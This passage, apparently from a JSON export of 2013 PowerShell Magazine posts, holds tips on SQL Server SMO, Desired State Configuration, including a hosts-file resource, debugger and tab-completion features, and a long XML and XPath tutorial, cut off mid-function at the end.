add extended properties using PowerShell.\nAdd-Type -AssemblyName \u0026quot;Microsoft.SqlServer.Smo, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\u0026quot; $server = New-Object Microsoft.SqlServer.Management.Smo.Server $env:COMPUTERNAME $extproperty = New-Object Microsoft.SqlServer.Management.Smo.ExtendedProperty $extproperty.Parent = $server.Databases['sqlchow'] #needs smo object. $extproperty.Name = 'Change made' $extproperty.Value = 'Recovery Model set to BulkLogged' $extproperty.Create() In this tip we are adding extended properties to a DB, you can add extended properties to other objects as well. For example, if you need to add extended properties to a table, the Parent is going to be:\n$server.Databases['sqlchow'].Tables['userdetails']   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/08/27/pstip-creating-extended-properties-on-database-objects-using-smo/","tags":["Tips and Tricks","SQL"],"title":"#PSTip Creating extended properties on database objects using SMO"},{"categories":["News"],"contents":"Just when I was thinking that there is a need for a nice regular expression helper for PowerShell, SAPIEN Technologies announced the community preview of their new product called PowerRegEx. PowerRegEx is a regular expression building tool that provides help and real-time testing.\nAs per the SAPIEN announcement, the key features available in this community preview of PowerRegEx are:\n Makes regular expression creation and discoverability easier, by grouping RegEx constructs by category. Provides descriptions and examples on how to use each regular expression construct. Includes sample regular expressions for Email, IP Address, and more. Ability to test regular expresses against an existing file or ad-hoc text. Export matches or non-matching lines. Export regular expressions for PowerShell use.  Go ahead and download the community preview. It’s free!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/08/27/sapien-technologies-announces-the-availability-of-powerregex-community-preview/","tags":["News"],"title":"SAPIEN Technologies announces the availability of PowerRegEx – Community Preview"},{"categories":["PowerShell DSC"],"contents":"Note: This tip requires PowerShell 4.0 and Windows Server 2012 R2 or Windows 8.1.\nWhen using the File resource in DSC, a confusing aspect to beginners is how to create an empty folder. If you look at the definition of this resource and the attributes, it gives an impression that you can only copy files/folders from SourcePath to DestinationPath. Well, that is not entirely accurate. You can also create empty folders and files.\nFor creating an empty folder, use the following configuration document. All you need is the DestinationPath and Type set to Directory.\nConfiguration FileDemo { Node SRV1-WS2012R2 { File FileDemo { Type = 'Directory' DestinationPath = 'C:\\TestUser3' Ensure = \u0026quot;Present\u0026quot; } } } FileDemo This will create an empty folder!\nNow, how do we create an empty file? Simple. We provide the path to the file as DestinationPath and supply an empty string as the value to Contents attribute.\nConfiguration FileDemo { Node SRV1-WS2012R2 { File FileDemo { DestinationPath = 'C:\\TestUser3\\Test.txt' Ensure = \u0026quot;Present\u0026quot; Contents = '' } } } FileDemo ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/08/26/pstip-create-an-empty-folderfile-using-desired-state-configuration-file-resource/","tags":["PowerShell DSC"],"title":"#PSTip Create an empty folder/file using Desired State Configuration File resource"},{"categories":["PowerShell DSC","Module Spotlight"],"contents":"Desired State Configuration is a new feature added to PowerShell 4.0 and Windows Server 2012 R2. DSC is a platform for deployment and management of configuration data. While there are several built-in DSC resources, it is possible to extend what we can achieve with DSC by creating custom resources.\nIn this article, I am introducing a new module I created to manage hosts file as a DSC resource. This custom DSC resource helps you add or remove entries to or from the hosts file in Windows Operating System.\nBefore I show you how you can use it, go ahead and download this custom DSC resource hosted on Github.\nOnce downloaded, you can copy the files to C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PSDesiredStateConfiguration\\PSProviders\\HostsFile folder.\nTo start using the hosts file resource, we need to create a configuration document. A typical configuration document for managing hosts file is shown in the example below.\nConfiguration HostsFileExample { Node \u0026quot;SRV2-WS2012R2\u0026quot; { HostsFile HostsFileDemo { HostName = \u0026quot;testhost100\u0026quot; IPAddress = \u0026quot;10.10.10.100\u0026quot; Ensure = \u0026quot;Present\u0026quot; } } } HostsFileExample The above example helps you add the hosts file entry on the remote computer named SRV2-WS2012R2. In the above example, setting Ensure=”Absent” will remove the host entry if it exists.\nWe can apply this configuration by saving the script file, dot-sourcing the script file, and then using Start-DSCConfiguration cmdlet to apply the configuration by providing the MOF file folder location as the value to –Path parameter.\nPS C:\\Demo\u0026gt; .\\demo.ps1 Directory: C:\\Demo\\HostsFileExample Mode LastWriteTime Length Name ---- ------------- ------ ---- -a--- 8/18/2013 2:53 AM 948 SRV2-WS2012R2.mof PS C:\\Demo\u0026gt; Start-DscConfiguration -Path .\\HostsFileExample -Wait -Verbose Now, if we need to extend the above example to add different entries to multiple remote computers, we can do that by adding one more Node script block.\nConfiguration HostsFileExample { Node \u0026quot;SRV2-WS2012R2\u0026quot; { HostsFile HostsFileDemo { HostName = \u0026quot;testhost100\u0026quot; IPAddress = \u0026quot;10.10.10.100\u0026quot; Ensure = \u0026quot;Present\u0026quot; } } Node \u0026quot;SRV2-WS2012R2\u0026quot; { HostsFile HostsFileDemo { HostName = \u0026quot;testhost120\u0026quot; IPAddress = \u0026quot;10.10.10.120\u0026quot; Ensure = \u0026quot;Present\u0026quot; } } } HostsFileExample  When we dot-source the above script, it will create a MOF file for each node specified in the configuration document. We can, then, simply point Start-DSCConfiguration cmdlet to apply the configuration.\nNow, what if we want to add multiple host entries per node in the configuration document? Simple! We add multiple HostsFile resource entries in a Node block. For example,\nConfiguration HostsFileExample { Node \u0026quot;SRV2-WS2012R2\u0026quot; { HostsFile HostsFileDemo { HostName = \u0026quot;testhost100\u0026quot; IPAddress = \u0026quot;10.10.10.100\u0026quot; Ensure = \u0026quot;Present\u0026quot; } } Node \u0026quot;SRV3-WS2012R2\u0026quot; { HostsFile HostsFileDemo { HostName = \u0026quot;testhost102\u0026quot; IPAddress = \u0026quot;10.10.10.102\u0026quot; Ensure = \u0026quot;Absent\u0026quot; } } Node \u0026quot;SRV1-WS2012R2\u0026quot; { HostsFile TestHost120 { HostName = \u0026quot;testhost120\u0026quot; IPAddress = \u0026quot;10.10.10.120\u0026quot; Ensure = \u0026quot;Absent\u0026quot; } HostsFile TestHost130 { HostName = \u0026quot;testhost130\u0026quot; IPAddress = \u0026quot;10.10.10.130\u0026quot; Ensure = \u0026quot;Present\u0026quot; } } } HostsFileExample  This is it. I have made this custom resource available on Github DSC repository created by Steven Murawski. Steve has a great guide on getting started with creating custom DSC resources which certainly was a starting point for the HostsFile resource. Feel free to log any issues or change requests. Also, fork it and update to suit your requirements.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/08/26/custom-dsc-resource-for-managing-hosts-file-entries/","tags":["PowerShell DSC","Modules"],"title":"Custom DSC resource for managing hosts file entries"},{"categories":["Columns","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 4.0 or above.\nIn this great post, Tobias walked you through the process of hiding functions from the debugger. In this tip, I want to show a dynamic way of doing the same, a way that doesn’t require access to the function code if for any reason you cannot decorate a function with the mentioned attribute. Here goes…\nStarting in Windows 4.0 script blocks have a new property: DebuggerHidden.\nPS\u0026gt; ${function:test}|gm d* TypeName: System.Management.Automation.ScriptBlock Name MemberType Definition ---- ---------- ---------- DebuggerHidden Property bool DebuggerHidden {get;set;} You can get its value to determine if a function is hidden from the debugger but more importantly, you can set its value and instruct the debugger to skip the function. Let’s create a function and try to debug it. Put the following code in a script file and save it (debugging works only for saved scripts).\nNow move your cursor to the function call (line 6) and press F9 to place a new breakpoint. Press F5 to execute the script and then start pressing F11 to step into the code, you’ll see that you’re the debugger steps into the function body and it is executed line by line until eventually you get the return value of the function.\nNow let’s set ask debugger to ignore and “step over” the function:\nRepeat the debugging process described earlier. Notice that now, when you press the F11 key, the debugger “ignores” the function and you immediately get the result.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/08/23/pstip-dynamically-hiding-a-function-from-the-debugger-in-powershell-ise/","tags":["Tips and Tricks"],"title":"#PSTip Dynamically hiding a function from the debugger in PowerShell ISE"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nPowerShell’s tab completion just got better in v3. In addition to all its awesomeness, it is now capable of completing service or process names, event log names, module names and the list is long.\n# event logs PS\u0026gt; Get-EventLog -LogName # services PS\u0026gt; Get-Service -Name # processes PS\u0026gt; Get-Process -Name There are many more new tab completion capabilities and features, and in this tip I would like to share with you two more less known locations where tab completion can help you discover possible values.\nThe first one is using a synthetic (calculated) property using the Format-* cmdlets. Just press the TAB key after the opening brace and you get completion for the hash table keys:\nThe second one also works for hash tables. If you press the tab key in the Property parameter of New-Object, you get completion of the properties of the object you’re creating:\n  Note that, in the ISE, you might need to press Ctrl+Space right after the opening brace to invoke Intellisense. ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/08/22/pstip-tab-completion-in-powershell-3-0/","tags":["Tips and Tricks"],"title":"#PSTip Tab Completion in PowerShell 3.0"},{"categories":["SQL","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nSometimes we need to know if a particular DB is available on a given instance before going ahead and making any configuration changes. The below code snippet allows you to quickly check if a DB is available on a particular SQL Server instance.\nAdd-Type -AssemblyName \u0026quot;Microsoft.SqlServer.Smo, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\u0026quot; $server = New-Object Microsoft.SqlServer.Management.Smo.Server $env:COMPUTERNAME if($server.Databases[\u0026quot;DatabaseName\u0026quot;]) { $true } else { $false } One thing to consider is that the state of the database will not be considered here. For example, if the database is ‘Offline’; the conditional will still return ‘True’ as the DB is available in the catalog. So, if we want to check if the DB is available and also accessible then we can use the following method. It returns a boolean value based on the database accessibility.\n$server.Databases[\"DatabaseName\"].IsAccessible   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/08/21/pstip-validate-is-a-database-is-available-on-a-sql-instance/","tags":["Tips and Tricks","SQL"],"title":"#PSTip Validate is a database is available on a SQL instance"},{"categories":["SQL","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nIn a previous tip, we checked out how to get the names of all databases to which a login is mapped and the username for that login in each database. Once, we have this information, we can enumerate the roles that are assigned to the user mapped to our login using EnumRoles() method.\nWe will use the Test-SQLLogin function described in an earlier tip.\nAdd-Type -AssemblyName \u0026quot;Microsoft.SqlServer.Smo, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\u0026quot; $login = 'TestUser' #SQLlogin or a windows login. if((Test-SQLLogin -SqlLogin $login)) { $server.Logins[\u0026quot;$login\u0026quot;].EnumDatabaseMappings() | Select DBName, UserName, @{Name=\u0026quot;AssignedRoles\u0026quot;; Expression={@($server.Databases[$_.DBName].Users[$_.UserName].EnumRoles())}} } DBName UserName AssignedRoles ------ -------- ------------- master TestUser {db_datareader, db_datawriter} msdb TestUser {db_backupoperator, db_datareader, db_datawriter} ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/08/20/pstip-finding-all-roles-a-particular-login-is-mapped-to-in-all-databases/","tags":["Tips and Tricks","SQL"],"title":"#PSTip Finding all roles a particular login is mapped to in all databases"},{"categories":["News"],"contents":"Microsoft has released a PowerShell module for Lync Online. You can now use the module to enable and disable push notifications for both iPhones and Windows Phones, manage Exchange Unified Messaging and hosted voicemail policies, manage meeting room endpoint devices with a Microsoft Exchange Server 2013 resource mailbox, grant client inband policies using pre-created policy instances, and you can also utilize Exchange Online cmdlets to extend the capabilities of Lync Online reports beyond the currently available reports in the Office 365 admin center.\nDownload Windows PowerShell Module for Lync Online (Note: To install the module, you will need to be running Windows PowerShell 3.0 and have installed Microsoft Online Services Sign-In Assistant or be running Windows 8)\nRelated resources:\n Introduction to Lync Online remote PowerShell documentation List of Lync Online Cmdlets Help documentation in MS Word format.  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/08/20/powershell-module-for-lync-online-is-available/","tags":["News"],"title":"PowerShell module for Lync Online is available"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nOne of the projects on which I work requires a validation step after each deployment. We need to validate if the logins have been mapped to all required roles in each of the application databases via users created for the login.\nIn todays tip, we will see how we can find all the databases to which a login is mapped. The login object in SMO has a method called EnumDatabaseMappings() which enumerates the login account mappings to databases and database users. We will use the Test-SQLLogin function described in an earlier tip.\nAdd-Type -AssemblyName \u0026quot;Microsoft.SqlServer.Smo, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\u0026quot; $login = 'TestUser' if((Test-SQLLogin -SqlLogin $login)) { $server = New-Object Microsoft.SqlServer.Management.Smo.Server $env:COMPUTERNAME $server.Logins[\u0026quot;$login\u0026quot;].EnumDatabaseMappings()| Select DBName, UserName } DBName UserName ------ -------- master TestUser msdb TestUser ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/08/19/pstip-finding-all-databases-to-which-a-login-is-mapped/","tags":["Tips and Tricks"],"title":"#PSTip Finding all databases to which a login is mapped"},{"categories":["How To","XML"],"contents":"PowerShell has awesome XML support. It is not obvious at first, but with a little help from your friends here at PowerShellMagazine.com, you’ll soon solve every-day XML tasks – even pretty complex ones – in no time.\nSo let’s check out how you put very simple PowerShell code to work to get the things done that used to be so mind-blowingly complex in the pre-PowerShell era.\nLet’s create an XML document from scratch, add new data sets, change pieces of information, add new data, remove data, and save an updated version of it to a new well-formed XML file.\nCreating New XML Documents Creating completely fresh XML documents from scratch used to be a tedious task. Many scripters resorted to creating XML files as a plain text. While that’s OK, it is error prone. Chances are that typos and case issues sneak in, and you may find yourself in an unfriendly world of malformed and dysfunctional XML.\nNo more, because there’s a buddy that can help you create XML documents: the XMLTextWriter object. It shields the complexity of dealing with the raw XML object model, and instead assists you in writing your pieces of information to an XML file.\nTo begin this story, let’s create a fairly complex XML document that the upcoming examples can use to play with. The goal is to create an XML document that has all the typical things in it: nodes, attributes, data sections, and comments.\n# this is where the document will be saved: $Path = \u0026quot;$env:temp\\inventory.xml\u0026quot; # get an XMLTextWriter to create the XML $XmlWriter = New-Object System.XMl.XmlTextWriter($Path,$Null) # choose a pretty formatting: $xmlWriter.Formatting = 'Indented' $xmlWriter.Indentation = 1 $XmlWriter.IndentChar = \u0026quot;`t\u0026quot; # write the header $xmlWriter.WriteStartDocument() # set XSL statements $xmlWriter.WriteProcessingInstruction(\u0026quot;xml-stylesheet\u0026quot;, \u0026quot;type='text/xsl' href='style.xsl'\u0026quot;) # create root element \u0026quot;machines\u0026quot; and add some attributes to it $XmlWriter.WriteComment('List of machines') $xmlWriter.WriteStartElement('Machines') $XmlWriter.WriteAttributeString('current', $true) $XmlWriter.WriteAttributeString('manager', 'Tobias') # add a couple of random entries for($x=1; $x -le 10; $x++) { $server = 'Server{0:0000}' -f $x $ip = '{0}.{1}.{2}.{3}' -f (0..256 | Get-Random -Count 4) $guid = [System.GUID]::NewGuid().ToString() # each data set is called \u0026quot;machine\u0026quot;, add a random attribute to it: $XmlWriter.WriteComment(\u0026quot;$x. machine details\u0026quot;) $xmlWriter.WriteStartElement('Machine') $XmlWriter.WriteAttributeString('test', (Get-Random)) # add three pieces of information: $xmlWriter.WriteElementString('Name',$server) $xmlWriter.WriteElementString('IP',$ip) $xmlWriter.WriteElementString('GUID',$guid) # add a node with attributes and content: $XmlWriter.WriteStartElement('Information') $XmlWriter.WriteAttributeString('info1', 'some info') $XmlWriter.WriteAttributeString('info2', 'more info') $XmlWriter.WriteRaw('RawContent') $xmlWriter.WriteEndElement() # add a node with CDATA section: $XmlWriter.WriteStartElement('CodeSegment') $XmlWriter.WriteAttributeString('info3', 'another attribute') $XmlWriter.WriteCData('this is untouched code and can contain special characters /\\@\u0026amp;lt;\u0026amp;gt;') $xmlWriter.WriteEndElement() # close the \u0026quot;machine\u0026quot; node: $xmlWriter.WriteEndElement() } # close the \u0026quot;machines\u0026quot; node: $xmlWriter.WriteEndElement() # finalize the document: $xmlWriter.WriteEndDocument() $xmlWriter.Flush() $xmlWriter.Close() notepad $path This script generates a fake server inventory with a lot of random information. The result is opened in notepad and will look similar to this:\nServer0001 31.248.95.170 51cb0dfb-75ed-4967-8392-47d87596c73c RawContent ]]  Server0002 33.60.233.89 9618b8bc-c200-46ce-b423-ee030555242d RawContent ]]  (...)  The purpose of this XML document is two-fold: it serves as an example how you can create XML files from scratch, and it serves as sample data for the following exercises.\nJust assume this was an XML file with relevant information. You can apply the tactics you are about to learn to any well-formed XML file.\nAttention: XMLTextWriter does a lot of magic for you, but you are responsible for creating meaningful content. One of the issues that can easily burn your feet is a malformed node name. Node names must not contain spaces.\nSo while “CodeSegment” is OK, “Code Segment” would not be OK. XML would try and name your node “Code”, then add an attribute named “Segment”, and finally choke on the fact that you never assigned a value to the attribute.\nFinding Information in XML Files One common task is to extract information from an XML file. Let’s assume you need a list of machines and their IP addresses. Provided you have generated the sample XML file above, then this is all it takes to create the report:\n# this is where the XML sample file was saved: $Path = \u0026quot;$env:temp\\inventory.xml\u0026quot; # load it into an XML object: $xml = New-Object -TypeName XML $xml.Load($Path) # note: if your XML is malformed, you will get an exception here # always make sure your node names do not contain spaces # simply traverse the nodes and select the information you want: $Xml.Machines.Machine | Select-Object -Property Name, IP The result will look similar to this:\nName IP ---- -- Server0001 31.248.95.170 Server0002 33.60.233.89 Server0003 226.6.1.30 Server0004 139.30.8.110 Server0005 94.104.253.8 Server0006 202.80.178.61 Server0007 22.217.227.159 Server0008 253.72.25.212 Server0009 233.147.116.60 Server0010 41.173.220.129 Note: Some of you may wonder why I used an XML object in the first place. Often you find code like this:\n# this is where the xml sample file was saved: $Path = \u0026quot;$env:temp\\inventory.xml\u0026quot; # load it into an XML object: [XML]$xml = Get-Content $Path The simple reason is performance. Reading in the XML file as a plain text file via Get-Content and then casting it to XML in a second step is a very expensive approach. Even though our XML file isn’t that large, the latter solution takes almost 7 times more time than the first one, and this will add up with even larger XML files.\nSo whenever you want to load an XML file, make sure you get an XML object and use its Load() method. This method is versatile enought by the way to also accept URLs, so you can use an URL to your favorite RSS feed as well – provided you have direct Internet access and no proxy settings to configure.\nPicking Particular Instances Let’s assume you do not want a list of all servers, but instead just want to look up the IP address and the information attribute info1 for a specific server in your list. You could use the same approach like this:\n$Xml.Machines.Machine | Where-Object { $_.Name -eq 'Server0009' } | Select-Object -Property IP, {$_.Information.info1}  This would get you the IP address for “server0009” plus the info1 attribute. Instead of querying all elements and then picking the one you are after on the client side, you can also use XPath, a XML query language:\n$item = Select-XML -Xml $xml -XPath '//Machine[Name=\"Server0009\"]' $item.Node | Select-Object -Property IP, {$_.Information.Info1}  The XPath query “//Machine[Name=”Server0009″]” looks for all “Machine” nodes that have a sub-node called “Name” with a value of “Server0009”.\nImportant: XPath is case-sensitive, so if the node name is “Machine”, then you cannot query for “machine”.\nAs a side note, in both approaches you need a script block to access attributes because the attribute “info1” is part of a sub-node “Information”. As always in these scenarios, you can use a hash table to assign a better name to that piece of information:\n$info1 = @{Name='AdditionalInfo'; Expression={$_.Information.Info1}} $item = Select-XML -Xml $xml -XPath '//Machine[Name=\"Server0009\"]' $item.Node | Select-Object -Property IP, $info1  The result will look similar to this:\nIP AdditionalInfo -- -------------- 97.196.140.12 some info  XPath is an extremely powerful XML query language. You can find information on its syntax all over the place in the Internet (check these links for example: http://www.w3schools.com/xpath/ and http://go.microsoft.com/fwlink/?LinkId=143609). When you read these documents, you will find that XPath can also use so-called “user-defined functions” like last() or lowercase(). These functions are not supported here.\nChanging XML Content Often, you will want to update information in an XML document. Rather than parsing the XML yourself, simply stick to the techniques you just learned.\nSo if you wanted to update Server0006 and assign it a new name and a different IP address, this is what you would do:\n$item = Select-XML -Xml $xml -XPath '//Machine[Name=\u0026quot;Server0006\u0026quot;]' $item.node.Name = \u0026quot;NewServer0006\u0026quot; $item.node.IP = \u0026quot;10.10.10.12\u0026quot; $item.node.Information.Info1 = 'new attribute info' $NewPath = \u0026quot;$env:temp\\inventory2.xml\u0026quot; $xml.Save($NewPath) notepad $NewPath As you can see, updating information is simple, and all changes you make are applied automatically to the underlying XML object. All you need to do is to save the changed XML object to file to make your changes permanent. The result is displayed in the Notepad editor and will look similar to this:\n\u0026lt;!--6. machine details--\u0026gt; \u0026lt;Machine test=\u0026quot;559669990\u0026quot;\u0026gt; \u0026lt;Name\u0026gt;NewServer0006\u0026lt;/Name\u0026gt; \u0026lt;IP\u0026gt;10.10.10.12\u0026lt;/IP\u0026gt; \u0026lt;GUID\u0026gt;cca8df99-78e1-48e0-8c4d-193c6d4acbd2\u0026lt;/GUID\u0026gt; \u0026lt;Information info1=\u0026quot;new attribute info\u0026quot; info2=\u0026quot;more info\u0026quot;\u0026gt;RawContent\u0026lt;/Information\u0026gt; \u0026lt;CodeSegment info3=\u0026quot;another attribute\u0026quot;\u0026gt;\u0026lt;![CDATA[this is untouched code and can contain special characters /\\@\u0026lt;\u0026gt;]]\u0026gt;\u0026lt;/CodeSegment\u0026gt; \u0026lt;/Machine\u0026gt; You have just made changes to an existing XML document in no time, without tricky parsing, and without risking to break XML structure.\nIn the same way, you can make bulk adjustments. Let’s assume all the servers are to get brand new names. Instead of “ServerXXXX”, the machines now need to be named like “Prod_ServerXXXX”. Here’s the solution:\nForeach ($item in (Select-XML -Xml $xml -XPath '//Machine')) { $item.node.Name = 'Prod_' + $item.node.Name } $NewPath = \u0026quot;$env:temp\\inventory2.xml\u0026quot; $xml.Save($NewPath) notepad $NewPath Note how all server names in the XML document have been updated. Select-XML this time won’t return just one object but many, one for each server. This is because XPath this time selects all “Machine” nodes without special filtering. That’s why all of these nodes need to be processed in a foreach loop.\nInside of the loop, the node “Name” is assigned a new value, and once all “Machine” nodes are updated, the XML document is saved and opened in Notepad.\nYou may argue that in this example, prepending the server name with “Prod”_ is really a trivial change, and that is true. There may be more complex requirements. However, the focus here is to show how you fundamentally change XML data, not how you do sophisticated string operations.\nStill, if you ask yourself how you would, for example, replace “ServerXXXX” with “PCXX” (including turning a 4-digit number into a 2-digit number, so this definitely is not a trivial change), here is a solution as well:\nforeach($item in (Select-XML -Xml $xml -XPath '//Machine')) { if ($item.node.Name -match 'Server(\\d{4})') { $item.node.Name = 'PC{0:00}' -f [Int]$matches[1] } } $NewPath = \"$env:temp\\inventory2.xml\" $xml.Save($NewPath) notepad $NewPath  This time, a regular expression extracts the numeric part of the original server name, then the -f operator reformats the number and adds it to the new server prefix.\nNeither regular expressions nor number formatting are in the focus of this article. The important part is to see that you are free to use whatever technique you like to construct the new server name. At the end of the day, changing the XML content always sticks to the same rules, though.\nAdding New Data Occasionally, updating data is not enough. You may want to add a new computer to the list. Again, this is straightforward. You simply pick an existing node, clone it, then update its content and append it to the parent of your liking. This way, you do not have to create the complex node structure yourself and can be certain that the new node is structured just like any of the existing nodes.\nThis will add a new machine to the list of machines:\n# clone an existing node structure $item = Select-XML -Xml $xml -XPath '//Machine[1]' $newnode = $item.Node.CloneNode($true) # update the information as needed # all other information is defaulted to the values from the original node $newnode.Name = 'NewServer' $newnode.IP = '1.2.3.4' # get the node you want the new node to be appended to: $machines = Select-XML -Xml $xml -XPath '//Machines' $machines.Node.AppendChild($newnode) $NewPath = \u0026quot;$env:temp\\inventory2.xml\u0026quot; $xml.Save($NewPath) notepad $NewPath Since the node you are adding is cloned from an existing node, all information in this new node is copied from the existing node. Information that you do not update will keep the old values.\nAnd what if you wanted to add the new node to the top of the list? Simply use InsertBefore() instead of AppendChild():\n# add it to the top of the list: $machines.Node.InsertBefore($newnode, $item.node)  Likewise, you can basically insert the new node anywhere. This would insert it right after Server0007:\n# add it after \"Server0007\": $parent = Select-XML -Xml $xml -XPath '//Machine[Name=\"Server0007\"]' $machines.Node.InsertAfter($newnode, $parent.node)  Removing XML Content Deleting data entirely from your XML file is just as easy. If you wanted to remove Server0007 from your list, here’s how:\n# remove \"Server0007\": $item = Select-XML -Xml $xml -XPath '//Machine[Name=\"Server0007\"]' $null = $item.Node.ParentNode.RemoveChild($item.node)  Enormous Power at Your Fingertips With the examples presented, you can now manage the most commonly needed XML manipulations in just a couple of lines of code. It is well worth investing some time into improving your XML and XPath proficiency – you can do amazing things with them.\nAnd for those of you that have sticked with me this long, I have a little present for you: a great little tool I use very often that can be very helpful for you, too, I am sure. It uses the exact same tactics you just heard about. Here’s the story:\nConvertTo-XML can convert any object into XML, and since XML is a hierarchical data format, preserving structure up to a given depth, it is an excellent way of examining nested object properties. So you can “unfold” an object structure and look at all of its properties, even the deeply nested ones.\nWithout XML and XPath, all you could do is look at plain XML and search for information yourself. For example, if you wanted to find out where exactly the $host object stores PowerShell’s color information, you could do this (which might be not such a good idea after all because you get flooded with raw XML information):\n$host | ConvertTo-XML -Depth 5 | Select-Object -ExpandProperty outerXML  With the knowledge just presented, you could now take the raw XML and extract and filter the object properties.\nSo here’s the promised function called Get-ObjectProperty which works a little bit like Get-Member on steroids. It can tell you which property inside an object holds the value you are after. Have a look:\nPS\u0026gt; $host | Get-ObjectProperty -Depth 2 -Name *color* Name Value Path Type ---- ----- ---- ---- TokenColors $obj1.PrivateData.To... Microsoft.PowerShel... ConsoleTokenColors $obj1.PrivateData.Co... Microsoft.PowerShel... XmlTokenColors $obj1.PrivateData.Xm... Microsoft.PowerShel... ErrorForegroundColor #FFFF0000 $obj1.PrivateData.Er... System.Windows.Medi... ErrorBackgroundColor #FFFFFFFF $obj1.PrivateData.Er... System.Windows.Medi... WarningForegroundColor #FFFF8C00 $obj1.PrivateData.Wa... System.Windows.Medi... WarningBackgroundColor #00FFFFFF $obj1.PrivateData.Wa... System.Windows.Medi... VerboseForegroundColor #FF00FFFF $obj1.PrivateData.Ve... System.Windows.Medi... VerboseBackgroundColor #00FFFFFF $obj1.PrivateData.Ve... System.Windows.Medi... DebugForegroundColor #FF00FFFF $obj1.PrivateData.De... System.Windows.Medi... DebugBackgroundColor #00FFFFFF $obj1.PrivateData.De... System.Windows.Medi... ConsolePaneBackgroun... #FF012456 $obj1.PrivateData.Co... System.Windows.Medi... ConsolePaneTextBackg... #FF012456 $obj1.PrivateData.Co... System.Windows.Medi... ConsolePaneForegroun... #FFF5F5F5 $obj1.PrivateData.Co... System.Windows.Medi... ScriptPaneBackground... #FFFFFFFF $obj1.PrivateData.Sc... System.Windows.Medi... ScriptPaneForeground... #FF000000 $obj1.PrivateData.Sc... System.Windows.Medi... This will return all nested properties inside of $host that have “Color” in its name. Console output most likely is truncated, so you are better off displaying the information in a grid view window:\n$host | Get-ObjectProperty -Depth 2 -Name *color* | Out-GridView  Note the column “Path”: this property specifies exactly how you would access a given nested property. In the example, Get-ObjectProperty walks two levels deep inside the object hierarchy. Greater depths will unfold even more information but will also pollute the results with more irrelevant noise information.\nWhile you can pipe in multiple objects, it is best to pipe only one object due to the large amount of resulting data. This line would list all nested properties in a process object, five levels deep, that have a numeric value:\nPS\u0026gt; Get-Process -id $pid | Get-ObjectProperty -Depth 5 -IsNumeric Name Value Path Type ---- ----- ---- ---- Handles 684 $obj1.Handles System.Int32 VM 1010708480 $obj1.VM System.Int32 WS 291446784 $obj1.WS System.Int32 PM 251645952 $obj1.PM System.Int32 NPM 71468 $obj1.NPM System.Int32 CPU 161,0398323 $obj1.CPU System.Double BasePriority 8 $obj1.BasePriority System.Int32 HandleCount 684 $obj1.HandleCount System.Int32 Id 4560 $obj1.Id System.Int32 Size 264 $obj1.MainModule.Size System.Int32 ModuleMemorySize 270336 $obj1.MainModule.Mod... System.Int32 FileBuildPart 9421 $obj1.MainModule.Fil... System.Int32 FileMajorPart 6 $obj1.MainModule.Fil... System.Int32 FileMinorPart 3 $obj1.MainModule.Fil... System.Int32 ProductBuildPart 9421 $obj1.MainModule.Fil... System.Int32 ProductMajorPart 6 $obj1.MainModule.Fil... System.Int32 ProductMinorPart 3 $obj1.MainModule.Fil... System.Int32 Size 264 $obj1.Modules[0].Size System.Int32 ModuleMemorySize 270336 $obj1.Modules[0].Mod... System.Int32 (...) And this line would return all nested properties of the spooler service object that is of type “String”:\nPS\u0026gt; Get-Service -Name spooler | Get-ObjectProperty -Type System.String Name Value Path Type ---- ----- ---- ---- Name spooler $obj1.Name System.String Name RPCSS $obj1.RequiredServic... System.String Name DcomLaunch $obj1.RequiredServic... System.String DisplayName DCOM Server Process ... $obj1.RequiredServic... System.String MachineName . $obj1.RequiredServic... System.String ServiceName DcomLaunch $obj1.RequiredServic... System.String Name RpcEptMapper $obj1.RequiredServic... System.String DisplayName RPC Endpoint Mapper $obj1.RequiredServic... System.String (...) And here’s the source code for Get-ObjectProperty. It is slightly more complex than just a couple of lines but still amazingly short, given the job it does for you.\nIt utilizes the exact same techniques that were just explained, so once you feel comfortable with the simple examples above, you can try and digest this one as well – or simply use it as a tool and not worry about its XML magic:\nFunction Get-ObjectProperty { param ( $Name = '*', $Value = '*', $Type = '*', [Switch]$IsNumeric, [Parameter(Mandatory=$true,ValueFromPipeline=$true)] [Object[]]$InputObject, $Depth = 4, $Prefix = '$obj' ) Begin { $x = 0 Function Get-Property { param ( $Node, [String[]]$Prefix ) $Value = @{Name='Value'; Expression={$_.'#text' }} Select-Xml -Xml $Node -XPath 'Property' | ForEach-Object {$i=0} { $rv = $_.Node | Select-Object -Property Name, $Value, Path, Type $isCollection = $rv.Name -eq 'Property' if ($isCollection) { $CollectionItem = \u0026quot;[$i]\u0026quot; $i++ $rv.Path = (($Prefix) -join '.') + $CollectionItem } else { $rv.Path = ($Prefix + $rv.Name) -join '.' } $rv if (Select-Xml -Xml $_.Node -XPath 'Property') { if ($isCollection) { $PrefixNew = $Prefix.Clone() $PrefixNew[-1] += $CollectionItem Get-Property -Node $_.Node -Prefix ($PrefixNew ) } else { Get-Property -Node $_.Node -Prefix ($Prefix + $_.Node.Name ) } } } } $Value = @{Name='Value'; 